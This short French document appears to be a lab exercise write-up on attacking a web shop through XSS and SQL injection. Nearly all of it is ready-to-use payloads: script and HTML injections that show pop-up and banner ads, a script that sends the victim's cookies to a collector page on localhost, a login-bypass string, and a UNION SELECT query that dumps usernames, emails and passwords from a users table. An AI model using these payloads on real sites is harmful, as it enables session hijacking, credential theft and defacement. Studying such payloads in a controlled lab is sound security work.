# Injection XSS
## Étape 2 : Exploitation des vulnérabilités XSS pour afficher publicité

```js
// Payload 1 - Popup publicitaire :
<script>alert('🎉 PROMO EXCEPTIONNELLE ! -50% sur tous les produits ! Cliquez OK pour en profiter !');</script>

// Payload 2 - Bannière publicitaire :
<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;z-index:9999;padding:10px;">🔥 OFFRE LIMITÉE ! Visitez www.promo-site.com 🔥</div>
```
## Étape 3 : Exploitation des vulnérabilités XSS pour voler des cookies
```js
// Payload 2 - Envoi vers serveur malveillant :
<script>fetch('http://localhost/cookie-steal/steal.php?cookie=' + encodeURIComponent(document.cookie));</script>
```

# Injection SQL
## Étape 2: Exploitation de l’injection SQL

```text
Pour l'injection SQL au niveau du formulaire de connexion
' OR '1' = '1' --

Pour l'injection SQL au niveau du formulaire de recherche
' OR '1' = '1' GROUP BY p.id, p.name, p.description, p.price, p.image_url, p.created_at UNION SELECT u.id, u.username || ' ' || u.email as name, u.password as description, 0 as price, null as image_url, null as created_at, 0 as comment_count, 0 as avg_rating FROM users u --
```
